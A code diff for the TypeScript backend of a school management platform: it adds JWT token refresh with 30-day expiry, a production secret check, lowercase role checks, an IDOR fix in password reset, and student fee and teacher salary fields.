@@ -1,3 +1,5 @@
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import { PrismaClient } from "./generated/prisma/client.ts";
 import { PrismaPg } from "@prisma/adapter-pg";
 import { SignJWT, jwtVerify } from "jose";
@@ -15,6 +17,9 @@ import { hashPassword } from "./auth.utils.ts";
 const adapter = new PrismaPg({ connectionString: process.env.DATABASE_URL! });
 const prisma = new PrismaClient({ adapter });
 
+if (process.env.NODE_ENV === "production" && !process.env.JWT_SECRET) {
+  throw new Error("JWT_SECRET must be set in production — refusing to start with the insecure dev fallback.");
+}
 const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET ?? "dev-secret");
 const FRONTEND_URL = process.env.FRONTEND_URL ?? "http://localhost:3000";
 
@@ -43,7 +48,7 @@ async function signToken(payload: Record<string, unknown>): Promise<string> {
   return new SignJWT(payload)
     .setProtectedHeader({ alg: "HS256" })
     .setIssuedAt()
-    .setExpirationTime("7d")
+    .setExpirationTime("30d")
     .sign(JWT_SECRET);
 }
 
@@ -60,22 +65,36 @@ function getToken(req: Request): string | null {
   return auth.slice(7);
 }
 
-async function authSA(req: Request): Promise<{ id: string; email: string } | null> {
+// If token was issued > 1 day ago, attach a refreshed 30d token so the client
+// stays logged in as long as they use the app at least once every 30 days.
+async function maybeRefreshToken(payload: Record<string, unknown>, h: Headers): Promise<void> {
+  const iat = typeof payload.iat === "number" ? payload.iat : 0;
+  const ageSecs = Math.floor(Date.now() / 1000) - iat;
+  if (ageSecs > 86400) { // older than 1 day → issue fresh token
+    const { iat: _iat, exp: _exp, ...rest } = payload;
+    const fresh = await signToken(rest);
+    h.set("X-Refresh-Token", fresh);
+  }
+}
+
+async function authSA(req: Request, h?: Headers): Promise<{ id: string; email: string } | null> {
   const token = getToken(req);
   if (!token) return null;
   const p = await verifyToken(token);
   if (!p || p.role !== "super_admin") return null;
+  if (h) await maybeRefreshToken(p, h);
   return { id: p.id as string, email: p.email as string };
 }
 
-async function authSchoolUser(req: Request): Promise<{ id: string; role: string; schoolId: string; schoolSlug: string } | null> {
+async function authSchoolUser(req: Request, h?: Headers): Promise<{ id: string; role: string; schoolId: string; schoolSlug: string } | null> {
   const token = getToken(req);
   if (!token) return null;
   const p = await verifyToken(token);
   if (!p || p.role === "super_admin") return null;
+  if (h) await maybeRefreshToken(p, h);
   return {
     id: p.id as string,
-    role: p.role as string,
+    role: (p.role as string).toLowerCase(),
     schoolId: p.schoolId as string,
     schoolSlug: p.schoolSlug as string,
   };
@@ -92,7 +111,7 @@ function slugify(name: string): string {
  * POST /api/auth/super-admin/create-school
  */
 async function createSchoolEndpoint(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
@@ -123,11 +142,11 @@ async function createSchoolUserEndpoint(
   h: Headers,
   role: "teacher" | "staff" | "student" | "parent"
 ): Promise<Response> {
-  const auth = await authSchoolUser(req);
+  const auth = await authSchoolUser(req, h);
   if (!auth) return err("Unauthorized", 401, h);
 
   // Only admin can create users
-  if (auth.role !== "ADMIN") return err("Only admin can create users", 403, h);
+  if (auth.role !== "admin") return err("Only admin can create users", 403, h);
 
   const body = await req.json().catch(() => null);
   if (!body) return err("Request body required", 400, h);
@@ -143,10 +162,10 @@ async function createSchoolUserEndpoint(
         action: `user.${role}.created`,
         entityType: "User",
         entityId: result.user.id,
-        details: JSON.stringify({
+        metadata: {
           email: result.user.email,
           createdBy: auth.id,
-        }),
+        },
       },
     });
 
@@ -173,11 +192,11 @@ async function bulkCreateUsersEndpoint(
   h: Headers,
   role: "teacher" | "staff" | "student" | "parent"
 ): Promise<Response> {
-  const auth = await authSchoolUser(req);
+  const auth = await authSchoolUser(req, h);
   if (!auth) return err("Unauthorized", 401, h);
 
   // Only admin can create users
-  if (auth.role !== "ADMIN") return err("Only admin can create users", 403, h);
+  if (auth.role !== "admin") return err("Only admin can create users", 403, h);
 
   const body = await req.json().catch(() => null);
   if (!Array.isArray(body?.users)) return err("users array is required", 400, h);
@@ -193,10 +212,10 @@ async function bulkCreateUsersEndpoint(
         action: `users.${role}.bulk_created`,
         entityType: "User",
         entityId: "bulk",
-        details: JSON.stringify({
+        metadata: {
           count: results.length,
           createdBy: auth.id,
-        }),
+        },
       },
     });
 
@@ -285,7 +304,7 @@ async function loginSchoolUserEndpoint(req: Request, h: Headers): Promise<Respon
  * GET /api/auth/school/me
  */
 async function getSchoolUserEndpoint(req: Request, h: Headers): Promise<Response> {
-  const auth = await authSchoolUser(req);
+  const auth = await authSchoolUser(req, h);
   if (!auth) return err("Unauthorized", 401, h);
 
   try {
@@ -301,7 +320,7 @@ async function getSchoolUserEndpoint(req: Request, h: Headers): Promise<Response
  * POST /api/auth/school/change-password
  */
 async function changePasswordEndpoint(req: Request, h: Headers): Promise<Response> {
-  const auth = await authSchoolUser(req);
+  const auth = await authSchoolUser(req, h);
   if (!auth) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
@@ -334,20 +353,22 @@ async function changePasswordEndpoint(req: Request, h: Headers): Promise<Respons
  * POST /api/auth/school/reset-password/:userId
  */
 async function resetPasswordEndpoint(req: Request, h: Headers, userId: string): Promise<Response> {
-  const auth = await authSchoolUser(req);
+  const auth = await authSchoolUser(req, h);
   if (!auth) return err("Unauthorized", 401, h);
 
   // Only admin can reset passwords
-  if (auth.role !== "ADMIN") return err("Only admin can reset passwords", 403, h);
+  if (auth.role !== "admin") return err("Only admin can reset passwords", 403, h);
 
   try {
-    const credentials = await resetUserPassword(prisma, userId);
-
-    // Verify user is in same school
+    // Verify the target user belongs to the admin's school BEFORE mutating
+    // anything — otherwise an admin from school A could reset a user in
+    // school B (the reset would run before the 404). IDOR fix.
     const targetUser = await prisma.user.findUnique({ where: { id: userId }, select: { schoolId: true } });
     if (!targetUser || targetUser.schoolId !== auth.schoolId) {
       return err("User not found", 404, h);
     }
+
+    const credentials = await resetUserPassword(prisma, userId);
 
     // Create audit log
     await prisma.auditLog.create({
@@ -356,7 +377,7 @@ async function resetPasswordEndpoint(req: Request, h: Headers, userId: string): 
         action: "auth.password_reset",
         entityType: "User",
         entityId: userId,
-        details: JSON.stringify({ resetBy: auth.id }),
+        metadata: { resetBy: auth.id },
       },
     });
 
@@ -387,7 +408,7 @@ async function loginSuperAdmin(req: Request, h: Headers): Promise<Response> {
 }
 
 async function meSuperAdmin(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const data = await prisma.superAdmin.findUnique({ where: { id: sa.id }, select: { id: true, email: true, name: true, createdAt: true } });
   if (!data) return err("Not found", 404, h);
@@ -397,7 +418,7 @@ async function meSuperAdmin(req: Request, h: Headers): Promise<Response> {
 // ─── Dashboard ────────────────────────────────────────────────────────────────
 
 async function dashboard(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const [totalSchools, activeSchools, trialSchools, suspendedSchools, pausedSchools,
@@ -462,7 +483,7 @@ async function dashboard(req: Request, h: Headers): Promise<Response> {
 // ─── Schools ──────────────────────────────────────────────────────────────────
 
 async function getSchools(req: Request, h: Headers, url: URL): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const page = Math.max(1, parseInt(url.searchParams.get("page") ?? "1"));
@@ -510,7 +531,7 @@ async function getSchools(req: Request, h: Headers, url: URL): Promise<Response>
 }
 
 async function createSchool(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
@@ -575,7 +596,7 @@ async function createSchool(req: Request, h: Headers): Promise<Response> {
 }
 
 async function getSchool(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const school = await prisma.school.findUnique({
@@ -592,7 +613,7 @@ async function getSchool(req: Request, h: Headers, id: string): Promise<Response
 }
 
 async function resetSchoolAdminPassword(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const school = await prisma.school.findUnique({ where: { id }, select: { id: true, slug: true } });
@@ -607,7 +628,7 @@ async function resetSchoolAdminPassword(req: Request, h: Headers, id: string): P
 }
 
 async function updateSchoolAdmin(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const school = await prisma.school.findUnique({ where: { id }, select: { id: true, slug: true } });
@@ -651,7 +672,7 @@ async function updateSchoolAdmin(req: Request, h: Headers, id: string): Promise<
 }
 
 async function updateSchool(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
@@ -746,7 +767,7 @@ async function updateSchool(req: Request, h: Headers, id: string): Promise<Respo
  * Automatically deletes: users, students, teachers, staff, parents, and all associated data
  */
 async function deleteSchool(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const school = await prisma.school.findUnique({
@@ -817,7 +838,7 @@ async function deleteSchool(req: Request, h: Headers, id: string): Promise<Respo
 // ─── Users ────────────────────────────────────────────────────────────────────
 
 async function getUsers(req: Request, h: Headers, url: URL): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const page = Math.max(1, parseInt(url.searchParams.get("page") ?? "1"));
@@ -864,7 +885,7 @@ async function getUsers(req: Request, h: Headers, url: URL): Promise<Response> {
 // ─── Plans ────────────────────────────────────────────────────────────────────
 
 async function getPlans(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const plans = await prisma.plan.findMany({
     orderBy: { price: "asc" },
@@ -874,7 +895,7 @@ async function getPlans(req: Request, h: Headers): Promise<Response> {
 }
 
 async function createPlan(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name || !body?.slug || body?.price === undefined) return err("name, slug, price required", 400, h);
@@ -890,7 +911,7 @@ async function createPlan(req: Request, h: Headers): Promise<Response> {
 }
 
 async function updatePlan(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   const plan = await prisma.plan.update({
@@ -905,7 +926,7 @@ async function updatePlan(req: Request, h: Headers, id: string): Promise<Respons
 }
 
 async function deletePlan(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const subs = await prisma.subscription.count({ where: { planId: id } });
   if (subs > 0) return err(`Cannot delete plan with ${subs} active subscriptions`, 400, h);
@@ -916,7 +937,7 @@ async function deletePlan(req: Request, h: Headers, id: string): Promise<Respons
 // ─── Payments ─────────────────────────────────────────────────────────────────
 
 async function getPayments(req: Request, h: Headers, url: URL): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const page = Math.max(1, parseInt(url.searchParams.get("page") ?? "1"));
@@ -945,7 +966,7 @@ async function getPayments(req: Request, h: Headers, url: URL): Promise<Response
 }
 
 async function recordPayment(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.schoolId || !body?.amount) return err("schoolId and amount required", 400, h);
@@ -979,7 +1000,7 @@ async function recordPayment(req: Request, h: Headers): Promise<Response> {
 // ─── Analytics ────────────────────────────────────────────────────────────────
 
 async function getAnalytics(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const [allSchools, subscriptions, revenue, thisMonthRevenue, districtData, userCounts] = await Promise.all([
@@ -1055,14 +1076,14 @@ async function getAnalytics(req: Request, h: Headers): Promise<Response> {
 // ─── Announcements ────────────────────────────────────────────────────────────
 
 async function getAnnouncements(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const items = await prisma.platformAnnouncement.findMany({ orderBy: { createdAt: "desc" }, take: 100 });
   return json(items, 200, h);
 }
 
 async function createAnnouncement(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.title || !body?.body) return err("title and body required", 400, h);
@@ -1074,7 +1095,7 @@ async function createAnnouncement(req: Request, h: Headers): Promise<Response> {
 }
 
 async function deleteAnnouncement(req: Request, h: Headers, id: string): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   await prisma.platformAnnouncement.delete({ where: { id } });
   return json({ ok: true }, 200, h);
@@ -1083,7 +1104,7 @@ async function deleteAnnouncement(req: Request, h: Headers, id: string): Promise
 // ─── Activity ─────────────────────────────────────────────────────────────────
 
 async function getActivity(req: Request, h: Headers, url: URL): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
 
   const page = Math.max(1, parseInt(url.searchParams.get("page") ?? "1"));
@@ -1108,7 +1129,7 @@ async function getActivity(req: Request, h: Headers, url: URL): Promise<Response
 // ─── Settings ─────────────────────────────────────────────────────────────────
 
 async function updateSettings(req: Request, h: Headers): Promise<Response> {
-  const sa = await authSA(req);
+  const sa = await authSA(req, h);
   if (!sa) return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
 
@@ -1137,7 +1158,7 @@ async function authSchool(req: Request): Promise<{ id: string; schoolId: string;
   if (!token) return null;
   const p = await verifyToken(token);
   if (!p || !p.schoolId || p.role === "super_admin") return null;
-  return { id: p.id as string, schoolId: p.schoolId as string, role: p.role as string, email: p.email as string };
+  return { id: p.id as string, schoolId: p.schoolId as string, role: (p.role as string).toLowerCase(), email: p.email as string };
 }
 
 async function authRole(req: Request, role: string): Promise<{ id: string; schoolId: string; role: string } | null> {
@@ -1278,6 +1299,10 @@ async function getStudents(req: Request, h: Headers, url: URL): Promise<Response
         busRouteName: s.busRoute?.name ?? null,
         academicYear: enroll?.academicYear?.name ?? null,
         feeStatus, status: s.user.status,
+        tuitionFee: s.tuitionFee ? Number(s.tuitionFee) : null,
+        busFee: s.busFee ? Number(s.busFee) : null,
+        otherFee: s.otherFee ? Number(s.otherFee) : null,
+        totalFee: [s.tuitionFee, s.busFee, s.otherFee].reduce((t, f) => t + (f ? Number(f) : 0), 0) || null,
       };
     }),
     total, page, limit, totalPages: Math.ceil(total / limit),
@@ -1293,7 +1318,7 @@ function generatePassword(firstName: string): string {
 
 async function createStudent(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || (u.role !== "ADMIN")) return err("Unauthorized", 401, h);
+  if (!u || (u.role !== "admin")) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
   if (!body?.firstName || !body?.lastName || !body?.email) return err("firstName, lastName, email required", 400, h);
@@ -1325,6 +1350,9 @@ async function createStudent(req: Request, h: Headers): Promise<Response> {
       class10Marks: body.class10Marks ?? null,
       entranceMarks: body.entranceMarks ?? null,
       stream: body.stream ?? null,
+      tuitionFee: body.tuitionFee ? Number(body.tuitionFee) : null,
+      busFee: body.busFee ? Number(body.busFee) : null,
+      otherFee: body.otherFee ? Number(body.otherFee) : null,
       ...(busRoute ? { busRoute: { connect: { id: busRoute.id } } } : {}),
       user: {
         create: {
@@ -1346,6 +1374,12 @@ async function createStudent(req: Request, h: Headers): Promise<Response> {
   if (busRoute && Number(busRoute.fee) > 0) {
     const ft = await transportFeeType(sid);
     await prisma.feeCollection.create({ data: { studentId: student.id, feeTypeId: ft.id, academicYearId: await activeYearId(sid), amountDue: busRoute.fee, dueDate: new Date(), status: "PENDING", remarks: "Auto-generated bus fee" } });
+  }
+
+  // Admission / tuition fee charged at creation (NPR).
+  if (Number(body.feeAmount) > 0) {
+    const ft = await tuitionFeeType(sid);
+    await prisma.feeCollection.create({ data: { studentId: student.id, feeTypeId: ft.id, academicYearId: await activeYearId(sid), amountDue: Number(body.feeAmount), dueDate: body.feeDueDate ? new Date(body.feeDueDate) : new Date(), status: "PENDING", remarks: body.feeRemarks?.trim() || "Admission fee" } });
   }
 
   await prisma.auditLog.create({ data: { school: { connect: { id: sid } }, action: "student.created", entityType: "Student", entityId: student.id, metadata: { name: `${body.firstName} ${body.lastName}` } } });
@@ -1389,7 +1423,7 @@ async function createStudent(req: Request, h: Headers): Promise<Response> {
 
 async function updateStudent(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
 
   const student = await prisma.student.findFirst({ where: { id, schoolId: u.schoolId }, include: { user: { include: { profile: true } } } });
   if (!student) return err("Student not found", 404, h);
@@ -1397,12 +1431,15 @@ async function updateStudent(req: Request, h: Headers, id: string): Promise<Resp
   const body = await req.json().catch(() => null);
   if (!body) return err("No data", 400, h);
 
-  // Student academic fields (only update keys that were sent).
+  // Student academic + fee fields (only update keys that were sent).
   const studentData: any = {};
   if (body.rollNumber !== undefined) studentData.rollNumber = body.rollNumber;
   if (body.class10Marks !== undefined) studentData.class10Marks = body.class10Marks;
   if (body.entranceMarks !== undefined) studentData.entranceMarks = body.entranceMarks;
   if (body.stream !== undefined) studentData.stream = body.stream;
+  if (body.tuitionFee !== undefined) studentData.tuitionFee = body.tuitionFee === "" || body.tuitionFee === null ? null : Number(body.tuitionFee);
+  if (body.busFee !== undefined) studentData.busFee = body.busFee === "" || body.busFee === null ? null : Number(body.busFee);
+  if (body.otherFee !== undefined) studentData.otherFee = body.otherFee === "" || body.otherFee === null ? null : Number(body.otherFee);
   if (Object.keys(studentData).length) await prisma.student.update({ where: { id }, data: studentData });
 
   await prisma.userProfile.update({
@@ -1448,7 +1485,7 @@ async function updateStudent(req: Request, h: Headers, id: string): Promise<Resp
 
 async function deleteStudent(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!student) return err("Not found", 404, h);
   await prisma.user.delete({ where: { id: student.userId } });
@@ -1457,7 +1494,7 @@ async function deleteStudent(req: Request, h: Headers, id: string): Promise<Resp
 
 async function updateStudentCredentials(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const student = await prisma.student.findFirst({ where: { id, schoolId: u.schoolId }, select: { userId: true, user: { select: { id: true, email: true } } } });
   if (!student) return err("Student not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -1514,7 +1551,7 @@ async function getTeachers(req: Request, h: Headers, url: URL): Promise<Response
 
 async function createTeacher(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
   if (!body?.firstName || !body?.lastName || !body?.email) return err("firstName, lastName, email required", 400, h);
@@ -1548,7 +1585,7 @@ async function createTeacher(req: Request, h: Headers): Promise<Response> {
 
 async function updateTeacherCredentials(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { id, user: { schoolId: u.schoolId } }, select: { userId: true, user: { select: { id: true, email: true } } } });
   if (!teacher) return err("Teacher not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -1567,14 +1604,19 @@ async function updateTeacherCredentials(req: Request, h: Headers, id: string): P
 
 async function updateTeacher(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { id, user: { schoolId: u.schoolId } }, include: { user: { include: { profile: true } } } });
   if (!teacher) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
   if (!body) return err("No data", 400, h);
   await Promise.all([
     prisma.userProfile.update({ where: { userId: teacher.userId }, data: { firstName: body.firstName, lastName: body.lastName, phone: body.phone, gender: body.gender } }),
-    prisma.teacher.update({ where: { id }, data: { qualification: body.qualification, experience: body.experience, specialization: body.specialization } }),
+    prisma.teacher.update({ where: { id }, data: {
+      qualification: body.qualification, experience: body.experience, specialization: body.specialization,
+      ...(body.salary !== undefined ? { salary: body.salary === "" || body.salary === null ? null : Number(body.salary) } : {}),
+      ...(body.allowances !== undefined ? { allowances: Number(body.allowances ?? 0) } : {}),
+      ...(body.deductions !== undefined ? { deductions: Number(body.deductions ?? 0) } : {}),
+    } }),
   ]);
   if (body.status) await prisma.user.update({ where: { id: teacher.userId }, data: { status: body.status } });
   return json({ ok: true }, 200, h);
@@ -1582,7 +1624,7 @@ async function updateTeacher(req: Request, h: Headers, id: string): Promise<Resp
 
 async function deleteTeacher(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const teacher = await prisma.teacher.findFirst({ where: { id, user: { schoolId: u.schoolId } } });
   if (!teacher) return err("Not found", 404, h);
   await prisma.user.delete({ where: { id: teacher.userId } });
@@ -1605,6 +1647,7 @@ async function getTeacherDetail(req: Request, h: Headers, id: string): Promise<R
     email: t.user.email, phone: p?.phone ?? null, gender: p?.gender ?? null,
     dateOfBirth: p?.dateOfBirth ?? null, address: p?.address ?? null, avatar: p?.avatar ?? null,
     qualification: t.qualification, experience: t.experience, specialization: t.specialization, joinDate: t.joinDate,
+    salary: t.salary ? Number(t.salary) : null, allowances: t.allowances ? Number(t.allowances) : 0, deductions: t.deductions ? Number(t.deductions) : 0,
     subjects: t.subjectAssignments.map((a) => a.subject.name),
   }, 200, h);
 }
@@ -1645,7 +1688,7 @@ async function getStaff(req: Request, h: Headers, url: URL): Promise<Response> {
 
 async function createStaff(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.firstName || !body?.email) return err("firstName and email required", 400, h);
   if (!body?.designation) return err("designation required (e.g. Accountant, Librarian)", 400, h);
@@ -1676,7 +1719,7 @@ async function createStaff(req: Request, h: Headers): Promise<Response> {
 
 async function updateStaff(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const staff = await prisma.staff.findFirst({ where: { id, schoolId: u.schoolId }, include: { user: { include: { profile: true } } } });
   if (!staff) return err("Staff not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -1699,7 +1742,7 @@ async function updateStaff(req: Request, h: Headers, id: string): Promise<Respon
 
 async function deleteStaff(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const staff = await prisma.staff.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!staff) return err("Not found", 404, h);
   await prisma.user.delete({ where: { id: staff.userId } });
@@ -1742,7 +1785,7 @@ async function getClasses(req: Request, h: Headers): Promise<Response> {
 
 async function createGrade(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   // Grade name is a free-text label — accepts both numbers ("11", "12") and
   // strings ("Nursery", "LKG", "Class X"). gradeNumber/level is an optional
@@ -1781,7 +1824,7 @@ async function createGrade(req: Request, h: Headers): Promise<Response> {
 
 async function createSection(req: Request, h: Headers, gradeId: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const grade = await prisma.grade.findFirst({ where: { id: gradeId, schoolId: u.schoolId } });
   if (!grade) return err("Grade not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -1817,7 +1860,7 @@ async function getAcademicYears(req: Request, h: Headers): Promise<Response> {
 
 async function createAcademicYear(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name || !body?.startDate || !body?.endDate) return err("name, startDate, endDate required", 400, h);
   if (body.isActive) await prisma.academicYear.updateMany({ where: { schoolId: u.schoolId }, data: { isActive: false } });
@@ -1827,7 +1870,7 @@ async function createAcademicYear(req: Request, h: Headers): Promise<Response> {
 
 async function updateAcademicYear(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const ay = await prisma.academicYear.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!ay) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -1847,7 +1890,7 @@ async function updateAcademicYear(req: Request, h: Headers, id: string): Promise
 
 async function deleteAcademicYear(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const ay = await prisma.academicYear.findFirst({ where: { id, schoolId: u.schoolId }, include: { _count: { select: { enrollments: true } } } });
   if (!ay) return err("Not found", 404, h);
   if ((ay as any)._count.enrollments > 0) return err("Cannot delete: this year has student enrollments. Archive it instead.", 400, h);
@@ -1857,7 +1900,7 @@ async function deleteAcademicYear(req: Request, h: Headers, id: string): Promise
 
 async function getPromotionPreview(req: Request, h: Headers, url: URL): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const fromYearId = url.searchParams.get("fromYearId");
   if (!fromYearId) return err("fromYearId required", 400, h);
 
@@ -1921,7 +1964,7 @@ async function getAttendance(req: Request, h: Headers, url: URL): Promise<Respon
 
 async function markAttendance(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || (u.role !== "ADMIN" && u.role !== "TEACHER")) return err("Unauthorized", 401, h);
+  if (!u || (u.role !== "admin" && u.role !== "teacher")) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
   if (!body?.sectionId || !body?.date || !body?.records) return err("sectionId, date, records required", 400, h);
@@ -2005,7 +2048,7 @@ async function getFees(req: Request, h: Headers, url: URL): Promise<Response> {
 
 async function collectFee(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
   if (!body?.studentId || !body?.feeTypeId || !body?.amountDue || !body?.dueDate) return err("studentId, feeTypeId, amountDue, dueDate required", 400, h);
@@ -2025,7 +2068,7 @@ async function collectFee(req: Request, h: Headers): Promise<Response> {
 
 async function recordFeePayment(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
 
   const fee = await prisma.feeCollection.findFirst({ where: { id, student: { schoolId: u.schoolId } } });
   if (!fee) return err("Not found", 404, h);
@@ -2056,7 +2099,7 @@ async function getNotices(req: Request, h: Headers): Promise<Response> {
 
 async function createNotice(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || (u.role !== "ADMIN" && u.role !== "TEACHER")) return err("Unauthorized", 401, h);
+  if (!u || (u.role !== "admin" && u.role !== "teacher")) return err("Unauthorized", 401, h);
 
   const body = await req.json().catch(() => null);
   if (!body?.title || !body?.content) return err("title and content required", 400, h);
@@ -2069,7 +2112,7 @@ async function createNotice(req: Request, h: Headers): Promise<Response> {
 
